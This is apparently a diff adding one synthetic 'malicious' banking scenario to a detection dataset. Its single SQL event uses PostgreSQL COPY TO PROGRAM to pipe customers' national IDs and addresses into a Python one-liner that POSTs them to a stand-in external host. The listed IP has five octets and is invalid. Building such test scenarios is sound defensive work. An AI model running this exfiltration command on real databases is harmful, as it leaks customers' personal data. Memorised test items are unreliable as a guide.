@@ -1,0 +1,31 @@
+scenario_id: gen_banking_38_copy_to_program_mal_952m
+family_id: gen_banking_38_copy_to_program_fam_952
+domain: banking
+time_of_day: '23:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'python3 -c
+      "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://analytics-mirror.datasink.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 185.220.101.118.125
+      port: 9443
+matched_pair_id: gen_banking_38_copy_to_program_pair_952
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
